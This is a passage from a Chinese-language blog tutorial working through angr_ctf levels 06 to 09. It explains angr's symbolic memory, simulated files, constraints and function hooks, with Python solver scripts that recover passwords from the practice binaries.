simgr.explore(find = <span class="hljs-number">0x8049381</span>, avoid = <span class="hljs-number">0x804936F</span>)<br>    <br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        solution_0 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_0, cast_to=<span class="hljs-built_in">bytes</span>)<br>        solution_1 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_1, cast_to=<span class="hljs-built_in">bytes</span>)<br>        solution_2 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_2, cast_to=<span class="hljs-built_in">bytes</span>)<br>        solution_3 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_3, cast_to=<span class="hljs-built_in">bytes</span>)<br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_0))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_1))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_2: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_2))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_3: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_3))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>这次的求解需要一点点时间，以及一定量的内存（笔者仅 2G 内存的阿里云学生机在跑解题脚本时就被 Kill 了几次，最后不得不用一些方法腾一些内存后才搞定</p><p><img src="https://s2.loli.net/2022/10/31/5Mymf9v8dTKUFWu.png" alt="image.png"></p><h2 id="06-angr-symbolic-dynamic-memory：符号化动态分配内存"><a href="#06-angr-symbolic-dynamic-memory：符号化动态分配内存" class="headerlink" title="06_angr_symbolic_dynamic_memory：符号化动态分配内存"></a>06_angr_symbolic_dynamic_memory：符号化动态分配内存</h2><p>惯例拖入 IDA 中，还是惯例地读入输入后 complex 处理后进行对比，不过不一样的是本题存储输入使用的是<strong>动态分配的内存</strong>：</p><p><img src="https://s2.loli.net/2022/10/31/dQEJzTtXKWZaPLV.png" alt="image.png"></p><p>那么怎么处理呢？我们可以从储存这两块内存的指针的地址入手，注意到两个指针 <code>buffer0</code> 与 <code>buffer1</code> 是两个全局变量：</p><p><img src="https://s2.loli.net/2022/10/31/XkKs9MjUmh2yGbw.png" alt="image.png"></p><ul><li>将初始状态设为<strong>读取完输入后的状态</strong></li><li>任意选两个地址作为 fake chunk 的地址，并将这两个 buffer 指针指向 fake chunk</li><li>再在 fake chunk 内存上放置相应的内存符号变量进行求解即可</li></ul><p>因为符号执行不会实际执行程序，所以这里我们任意设置 fake chunk 地址并不会导致 segmentation fault 的发生，需要注意的是对于具体的值而言我们别忘了通过 <code>endness</code> 参数指定大小端序</p><p>于是最后的解题脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python3">import angr<br>import claripy<br><br>def solver():<br>    bin_path = &#x27;./06_angr_symbolic_dynamic_memory&#x27;<br>    proj = angr.Project(bin_path)<br>    start_addr = 0x804938C # first insn after scanf()<br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    <br>    # set the buffer0&#x27;s and buffer1&#x27;s val to our specific address<br>    buf0_addr = 0x9B20684<br>    buf1_addr = 0x9B2068C<br>    fake_chunk0_addr = 0x1145140<br>    fake_chunk1_addr = 0x1919810<br>    init_state.memory.store(buf0_addr,fake_chunk0_addr, endness=proj.arch.memory_endness)<br>    init_state.memory.store(buf1_addr,fake_chunk1_addr, endness=proj.arch.memory_endness)<br>    <br>    # create symbolic vals and set fake_chunk to them<br>    password_0 = claripy.BVS(&#x27;password_0&#x27;, 64) # 8 bytes = 64 bits<br>    password_1 = claripy.BVS(&#x27;password_1&#x27;, 64) # 8 bytes = 64 bits<br>    init_state.memory.store(fake_chunk0_addr, password_0)<br>    init_state.memory.store(fake_chunk1_addr, password_1)<br>    <br>    # now to solve!<br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = 0x8049452, avoid = 0x8049440)<br>    <br>    if simgr.found:<br>        solution_state = simgr.found[0]<br>        solution_0 = solution_state.solver.eval(password_0, cast_to=bytes)<br>        solution_1 = solution_state.solver.eval(password_1, cast_to=bytes)<br>        <br>        print(&#x27;password_0: &#123;&#125;&#x27;.format(solution_0))<br>        print(&#x27;password_1: &#123;&#125;&#x27;.format(solution_1))<br>    else:<br>        raise Exception(&#x27;Could not find the solution!&#x27;)<br><br>if __name__ == &quot;__main__&quot;:<br>    solver()<br></code></pre></td></tr></table></figure><p>还是秒解：</p><p><img src="https://s2.loli.net/2022/10/31/6Oyk2cTxbDjpYVE.png" alt="image.png"></p><h2 id="07-angr-symbolic-file：符号化文件"><a href="#07-angr-symbolic-file：符号化文件" class="headerlink" title="07_angr_symbolic_file：符号化文件"></a>07_angr_symbolic_file：符号化文件</h2><p>惯例拖入 IDA 中，发现其会先读入 64 字节，之后通过 <code>ignoreme()</code> 将其写入一个特定文件中，再从该文件中把输入读回来，之后就又是常规的 complex 操作一番后与一个特定字符串进行比对</p><p><img src="https://s2.loli.net/2022/10/31/snWIloVkGtUxcdz.png" alt="image.png"></p><p>比较容易想到的方法就是<strong>直接从文件读入结束后开始作为初始状态</strong>，之后用 05 的符号化内存的方法来求解，不过这样就不是这道题出题的目的了：）</p><h3 id="Emulated-Filesystem-angr-的文件系统"><a href="#Emulated-Filesystem-angr-的文件系统" class="headerlink" title="Emulated Filesystem - angr 的文件系统"></a>Emulated Filesystem - angr 的文件系统</h3><p>在 angr 当中与文件系统间的操作是通过 <code>SimFile</code> 对象完成的，SimFile 为对  <em>存储</em>  的抽象模型，一个 SimFile 对象可以表示一系列的字节、符号等</p><p>我们可以通过 <code>angr.SimFile()</code> 来创建一个模拟文件，创建带有具体值与符号变量的 SimFile 🌰如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> angr, claripy<br><span class="hljs-meta">&gt;&gt;&gt; </span>sim_file = angr.SimFile(<span class="hljs-string">&#x27;a_file&#x27;</span>, content = <span class="hljs-string">&quot;flag&#123;F4k3_f1@9!&#125;\n&quot;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs = claripy.BVS(<span class="hljs-string">&#x27;bvs&#x27;</span>, <span class="hljs-number">64</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>sim_file2 = angr.SimFile(<span class="hljs-string">&#x27;another_file&#x27;</span>, bvs, size=<span class="hljs-number">8</span>) <span class="hljs-comment"># size in bytes there</span><br></code></pre></td></tr></table></figure><p>模拟文件需要与特定的状态进行关联，通过 <code>state.fs.insert(sim_file)</code>  我们可以将 SimFile 插入到一个状态的文件系统中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>state.fs.insert(<span class="hljs-string">&#x27;test_file&#x27;</span>, sim_file)<br></code></pre></td></tr></table></figure><p>我们还可以从文件中读取内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>pos = <span class="hljs-number">0</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>data, actural_read, pos = sim_file.read(pos, <span class="hljs-number">0x100</span>)<br></code></pre></td></tr></table></figure><p>对于  <em>流</em>  （Streams，例如标准IO、TCP连接等）类型的文件，我们可以用 <code>angr.SimPackets()</code> 来创建：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>sim_packet = angr.SimPackets(<span class="hljs-string">&#x27;my_packet&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>sim_packet<br>&lt;angr.storage.file.SimPackets <span class="hljs-built_in">object</span> at <span class="hljs-number">0x7f75626a2e80</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="FINAL-EXPLOIT-3"><a href="#FINAL-EXPLOIT-3" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>那么本题实际上是让我们利用 angr 来创建一个<strong>模拟文件</strong>以模拟读取文件的过程，这里我们将初始状态设为从打开文件开始，之后创建一个位向量符号放入模拟文件并将模拟文件插入文件系统，之后探索到对应状态后求解即可，解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;Good Job.&quot;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;Try again.&quot;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_file = <span class="hljs-string">&#x27;./07_angr_symbolic_file&#x27;</span><br>    proj = angr.Project(bin_file)<br>    start_address = <span class="hljs-number">0x8049550</span> <span class="hljs-comment"># first insn returned from ignoreme()</span><br>    init_state = proj.factory.blank_state(addr = start_address)<br><br>    <span class="hljs-comment"># create BVS and SimFile</span><br>    file_size = <span class="hljs-number">0x40</span><br>    password = claripy.BVS(<span class="hljs-string">&#x27;password&#x27;</span>, file_size * <span class="hljs-number">8</span>) <span class="hljs-comment"># 0x40 bytes</span><br>    file_name = <span class="hljs-string">&#x27;KBECVEJF.txt&#x27;</span><br>    sim_file = angr.storage.SimFile(file_name, password, size = file_size)<br><br>    <span class="hljs-comment"># load the SimFile</span><br>    init_state.fs.insert(file_name, sim_file)<br><br>    <span class="hljs-comment"># solve it</span><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        solution = solution_state.solver.<span class="hljs-built_in">eval</span>(password, cast_to=<span class="hljs-built_in">bytes</span>)<br>        <span class="hljs-built_in">print</span>(solution)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Could not find the solution&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>还是秒解：</p><p><img src="https://s2.loli.net/2022/10/31/lTfoUMzQANGSbnH.png" alt="image.png"></p><h1 id="0x03-angr-ctf：约束条件"><a href="#0x03-angr-ctf：约束条件" class="headerlink" title="0x03. angr-ctf：约束条件"></a>0x03. angr-ctf：约束条件</h1><h2 id="08-angr-constraints：添加约束"><a href="#08-angr-constraints：添加约束" class="headerlink" title="08_angr_constraints：添加约束"></a>08_angr_constraints：添加约束</h2><p>惯例拖入 IDA，还是读入输入后 complex 函数处理后进行比对的模式，这里的 <code>0x804C040</code> 就是 <code>buffer</code> 的地址，不过其自定义了一个对比函数：</p><p><img src="https://s2.loli.net/2022/10/31/4DXMH3GIQdiZOwC.png" alt="image.png"></p><p>自定义的对比函数比较常规，其中的 <code>0x804C030</code> 便是 <code>password</code> 的地址：</p><p><img src="https://s2.loli.net/2022/10/31/sxXtqvHYyiN5COg.png" alt="image.png"></p><p>在 <code>check_equals_xx()</code> 函数当中由于其选择了逐字符比较后增加计数的比较方式的缘故，会导致 <strong>路径爆炸</strong>（path explosion）的问题</p><h3 id="angr-中的约束"><a href="#angr-中的约束" class="headerlink" title="angr 中的约束"></a>angr 中的约束</h3><p>前面我们讲到位向量之间可以进行运算，类似地，位向量之间也可以进行<strong>比较运算</strong> ，其结果为 <code>Bool</code> 类型的对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvv = claripy.BVV(<span class="hljs-number">0xdeadbeef</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv2 = claripy.BVV(<span class="hljs-number">0xdeadbeef</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv == bvv2<br>&lt;Bool <span class="hljs-literal">True</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs = claripy.BVS(<span class="hljs-string">&#x27;bvs&#x27;</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs == bvv + bvv2<br>&lt;Bool bvs_0_32 == <span class="hljs-number">0xbd5b7dde</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs2 = claripy.BVS(<span class="hljs-string">&#x27;bvs2&#x27;</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs2 &gt; bvs * bvv + bvv2<br>&lt;Bool bvs2_1_32 &gt; bvs_0_32 * <span class="hljs-number">0xdeadbeef</span> + <span class="hljs-number">0xdeadbeef</span>&gt;<br></code></pre></td></tr></table></figure><p>对于带有符号值的比较而言， <code>Bool</code> 类型的对象直接表示了对应的式子，因此可以作为<strong>约束条件</strong>被添加到一个状态当中，我们可以通过 <code>state.solver.add()</code> 为对应状态添加约束：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>state.solver.add(bvs == bvv + bvv2)<br><span class="hljs-meta">&gt;&gt;&gt; </span>state.solver.add(bvs2 &gt; bvs * bvv + bvv2)<br><span class="hljs-meta">&gt;&gt;&gt; </span>state.solver.<span class="hljs-built_in">eval</span>(bvs2) <span class="hljs-comment"># get the concrete value under constraints</span><br></code></pre></td></tr></table></figure><p>除了 Bool 类以外，Claripy 还提供了一些以位向量作为结果的运算操作，以下是一个🌰（完整的还是去读<a href="https://docs.angr.io/advanced-topics/claripy">文档</a>吧）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>claripy.If(bvs == bvs2, bvs, bvs2)<br>&lt;BV32 <span class="hljs-keyword">if</span> bvs_0_32 == bvs2_1_32 then bvs_0_32 <span class="hljs-keyword">else</span> bvs2_1_32&gt;<br></code></pre></td></tr></table></figure><h3 id="FINAL-EXPLOIT-4"><a href="#FINAL-EXPLOIT-4" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>由于待比较字符串是固定的，故我们可以让 <code>explore()</code> 在完成对输入的变换后、在进入比较函数之前停下，之后直接为该状态手动添加一个对应的约束后进行求解即可</p><p>这里添加约束的方法是使用 <code>state.memory.load(addr, size_in_bytes)</code> 成员函数将当前状态的某个内存区域作为一个 BVS 提取出来，之后通过 <code>state.add_constraints(condition)</code> 添加约束指定该块内存在当前状态下的值为特定字符串，最后使用 <code>state.solver.eval()</code> 求解原来的 buffer 即可</p><p>最终的解题脚本如下，详见注释：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_file = <span class="hljs-string">&#x27;./08_angr_constraints&#x27;</span><br>    proj = angr.Project(bin_file)<br>    start_addr = <span class="hljs-number">0x804935D</span> <span class="hljs-comment"># first insn after scanf()</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br><br>    <span class="hljs-comment"># BVS for buffer</span><br>    buffer_addr = <span class="hljs-number">0x804C040</span><br>    buffer_size = <span class="hljs-number">0x10</span><br>    buffer = claripy.BVS(<span class="hljs-string">&#x27;buffer&#x27;</span>, buffer_size * <span class="hljs-number">8</span>)<br>    init_state.memory.store(buffer_addr, buffer)<br><br>    <span class="hljs-comment"># explore to check_equals()</span><br>    check_addr = <span class="hljs-number">0x80493A9</span> <span class="hljs-comment"># last insn before call check_equals() </span><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = check_addr)<br>    check_state = simgr.found[<span class="hljs-number">0</span>]<br><br>    <span class="hljs-comment"># get the buffer BVS of check_state</span><br>    password = check_state.memory.load(buffer_addr, buffer_size)<br>    compared_str = <span class="hljs-string">&quot;EFJLFOGMURLEVNXN&quot;</span><br><br>    <span class="hljs-comment"># add and solve the constraints</span><br>    check_state.add_constraints(password == compared_str)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;password: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(check_state.solver.<span class="hljs-built_in">eval</span>(buffer, cast_to=<span class="hljs-built_in">bytes</span>)))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>还是秒解：</p><p><img src="https://s2.loli.net/2022/11/01/Lh5YzU3RPyD2ZTW.png" alt="image.png"></p><h1 id="0x04-angr-ctf：函数操作"><a href="#0x04-angr-ctf：函数操作" class="headerlink" title="0x04. angr-ctf：函数操作"></a>0x04. angr-ctf：函数操作</h1><h2 id="09-angr-hooks：函数替换"><a href="#09-angr-hooks：函数替换" class="headerlink" title="09_angr_hooks：函数替换"></a>09_angr_hooks：函数替换</h2><p>惯例拖入 IDA，程序大概的主体逻辑是读入 buffer 后经过 <code>complex_function()</code> 运算，之后通过 <code>check_equals()</code> 与 password 进行对比并把结果存到 <code>equals</code> 变量当中；之后将 password 经过 <code>complex_function()</code> 运算，随后再读入 buffer 与 password 进行对比；两个条件都符合了才会输出 <code>&quot;Good Job.&quot;</code> </p><p>其中 <code>0x804C044</code> 就是 buffer 的地址，<code>0x804C034</code> 就是 password 的地址</p><p><img src="https://s2.loli.net/2022/11/02/sIjxptNAr7ZCeuo.png" alt="image.png"></p><p>其中 <code>check_equals()</code> 逻辑比较简单，就算简单的与 password 进行对比，不过由于是<strong>逐字符对比</strong>后增加统计数量，因此会导致<strong>路径爆炸</strong>：</p><p><img src="https://s2.loli.net/2022/11/02/5NAMaSsoHVZ4geL.png" alt="image.png"></p><p>如果是像 02 那样直接求解，<code>check_equals()</code> 带来的路径爆炸会非常令人头大，而该函数的功能本质上就仅是与一个字符串进行对比，因此我们可以<strong>使用 angr 来 hook 掉该函数，自行实现等价的操作函数</strong></p><h3 id="project-hook-函数钩子"><a href="#project-hook-函数钩子" class="headerlink" title="project.hook() - 函数钩子"></a>project.hook() - 函数钩子</h3><p>有的时候我们会有需要 hook 掉某个函数的需求，此时我们可以使用 <code>project.hook(addr = call_insn_addr, hook = my_function, length = n)</code> 来 hook 掉对应的 call 指令，其中 <code>call_insn_addr</code> 为 call 指令的地址，<code>my_function</code> 为我们的自定义函数， <code>length</code> 为 call 指令的长度：</p><p><img src="https://s2.loli.net/2022/11/02/Y5ptBU8oAsTdj7c.png" alt="image.png"></p><p>我们的自定义函数应当为接收 <code>state</code> 作为参数的函数，angr 还提供了 decorator 语法糖，因此以下两种写法都可以：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># method 1</span><br><span class="hljs-meta">@project.hook(<span class="hljs-params"><span class="hljs-number">0x1234</span>, length=<span class="hljs-number">5</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_hook_func</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-comment"># do something, this is an example</span><br>    state.regs.eax = <span class="hljs-number">0xdeadbeef</span><br><br><span class="hljs-comment"># method 2</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_hook_func2</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-comment"># do something, this is an example</span><br>    state.regs.eax = <span class="hljs-number">0xdeadbeef</span><br>proj.hook(addr = <span class="hljs-number">0x5678</span>, hook = my_hook_func2, length = <span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><h3 id="FINAL-EXPLOIT-5"><a href="#FINAL-EXPLOIT-5" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>因此本题我们只需要 hook 掉比较函数便能解决路径爆炸的问题，我们使用 <code>claripy.If()</code> 创建一个比较并将值给到 eax 寄存器作为返回值，最后就是常规的内存符号化后求解即可，最终的求解脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./09_angr_hooks&#x27;</span><br>    proj = angr.Project(bin_path)<br><br>    buffer_addr = <span class="hljs-number">0x804C044</span><br>    buffer_size = <span class="hljs-number">0x10</span><br>    compared_str = <span class="hljs-string">b&#x27;XFQUUEQFKBECVEJF&#x27;</span><br><br>    start_addr = <span class="hljs-number">0x804937D</span> <span class="hljs-comment"># first insn after first scanf()</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br><br>    buffer = claripy.BVS(<span class="hljs-string">&#x27;buffer&#x27;</span>, buffer_size * <span class="hljs-number">8</span>)<br>    init_state.memory.store(buffer_addr, buffer)<br><br>    <span class="hljs-comment"># because we have passed the qmemcpy() that initial the password&#x27;s memory,</span><br>    <span class="hljs-comment"># so we need to do it manually</span><br>    password_size = <span class="hljs-number">0x10</span><br>    password_addr = <span class="hljs-number">0x804C034</span><br>    init_state.memory.store(password_addr,<br>                            claripy.BVV(<span class="hljs-built_in">int</span>.from_bytes(compared_str, <span class="hljs-string">&quot;big&quot;</span>), <br>                                        password_size * <span class="hljs-number">8</span>))<br><br><span class="hljs-meta">    @proj.hook(<span class="hljs-params">addr = <span class="hljs-number">0x80493CE</span>, length = <span class="hljs-number">5</span></span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">my_hook_func</span>(<span class="hljs-params">state</span>):<br>        buffer = state.memory.load(buffer_addr, buffer_size)<br>        <span class="hljs-comment"># eax is used for return val</span><br>        state.regs.eax = claripy.If(buffer == compared_str, <span class="hljs-comment"># constraint</span><br>                                    <span class="hljs-comment"># if success, return 1, else return 0</span><br>                                    claripy.BVV(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>), claripy.BVV(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>))<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = <span class="hljs-number">0x80493D3</span>) <span class="hljs-comment"># first insn after my_hook_func() returned</span><br><br>    check_state = simgr.found[<span class="hljs-number">0</span>]<br>    check_state.add_constraints(check_state.regs.eax == <span class="hljs-number">1</span>) <span class="hljs-comment"># constraint for eval == 1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;password0: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(check_state.solver.<span class="hljs-built_in">eval</span>(buffer, cast_to=<span class="hljs-built_in">bytes</span>)))<br><br>    <span class="hljs-comment"># now we need to calculate the password&#x27;s val after complex()</span><br>    simgr2 = proj.factory.simgr(check_state)<br>    simgr2.explore(find = <span class="hljs-number">0x8049428</span>) <span class="hljs-comment"># last insn before second scanf()</span><br><br>    check_state2 = simgr2.found[<span class="hljs-number">0</span>]<br>    password = check_state2.memory.load(password_addr, password_size)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;password1: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(check_state2.solver.<span class="hljs-built_in">eval</span>(password, cast_to=<span class="hljs-built_in">bytes</span>)))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>还是秒解：</p><p><img src="https://s2.loli.net/2022/11/02/xHpXA6WNqwisaLT.png" alt="image.png"></p><blockquote><p>当然，还有一种更加简洁的写法就是 hook 掉 <code>check_equals()</code> 之后直接从 <code>entry_state</code> 开始 explore() 到输出 <code>&quot;Good Job.&quot;</code> ，但笔者在刚开始写的时候是没想到的…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 